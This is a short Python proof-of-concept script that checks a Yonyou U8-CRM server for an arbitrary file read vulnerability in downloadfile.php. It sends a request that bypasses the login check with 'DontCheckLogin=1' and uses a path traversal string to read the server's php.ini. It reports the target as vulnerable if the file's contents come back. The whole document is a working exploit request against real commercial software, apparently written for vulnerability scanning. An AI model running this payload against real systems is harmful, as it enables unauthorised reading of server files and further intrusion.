import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友U8-CRM客户关系管理系统downloadfile.php存在任意文件读取漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close'
    }
    vurl = urllib.parse.urljoin(url, "/pub/downloadfile.php?DontCheckLogin=1&url=/datacache/../../../apache/php.ini")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code == 200 and '[PHP]' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult